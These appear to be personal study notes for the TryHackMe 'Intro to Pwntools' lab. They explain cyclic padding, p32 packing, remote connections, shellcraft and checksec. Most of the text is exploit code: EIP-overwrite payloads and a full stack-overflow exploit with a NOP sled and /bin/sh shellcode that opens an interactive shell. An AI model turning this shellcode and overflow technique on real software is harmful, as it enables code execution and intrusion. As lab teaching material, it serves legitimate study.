TryHackMe Room: https://tryhackme.com/room/introtopwntools
Github: https://github.com/dizmascyberlabs/IntroToPwntools

## Commands & Code

### Cyclic
- Cyclic allows you to output random alphabet chars X times in some kinda random order to allow you easily find which pattern overflowed the program when invetigating with gdb
- Equvilant code:
```py 
from pwn import *

padding = cyclic(100) # padding = aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
padding = cyclic(cyclic_find('jaaa')) # will right as many patterns as it needs until it reaches this specific pattern "jaaa"
eip = p32(0x8048536) # p32 & p64 which is equal to struct.pack and struct.unpack which is useful when giving an input as actual hex -- e.g. p32(0xdeadbeef) == b'\xde\xad\xbe\xef'

payload = padding + eip

print(payload)
```

## Network Pwning
- When trying to communicate with network service such as netcat to a ip & port you can (and for ease of use) use pwntools to send and recieve data e.g.
```py
from pwn import *


connect = remote('127.0.0.1', 1337) # create a connection to ip & port

print(connect.recvn(18)) # recvn recieves input of 18 bytes (strict), recvline(), recv() and recvuntil("some text: ")
payload = "A"*32 # repeat char 'A' 32 times
payload += p32(0xdeadbeef)
connect.send(payload) # send data to connection
print(connect.recvn(34)) # print recieved data

connect.interactive() # most important when dealing with RCE or anything that requires terminal interaction otherwise the connection will be closed/not interacted with
```

## Shellcraft
- One of the most amazing commands/functions is `shellcraft` it can be used as a terminal command or a python function from pwntools lib
- E.g.
```py
from pwn import *

proc = process('./intro2pwnFinal')
proc.recvline()

padding = cyclic(cyclic_find('taaa'))
eip = p32(0xffffd4e0+200)
nop_sled = "\x90"*1000

execu = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80" # generated using command `shellcraft i386.linux.sh -f s` see `shellcraft -h` for more amazing info

payload = padding + eip + nop_sled + execu
#print(payload)
proc.send(payload)
proc.interactive()
```

## Checksec
- One of the amazing commands as well to check if an ELF/executable file have specific security protections such as:
```v
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```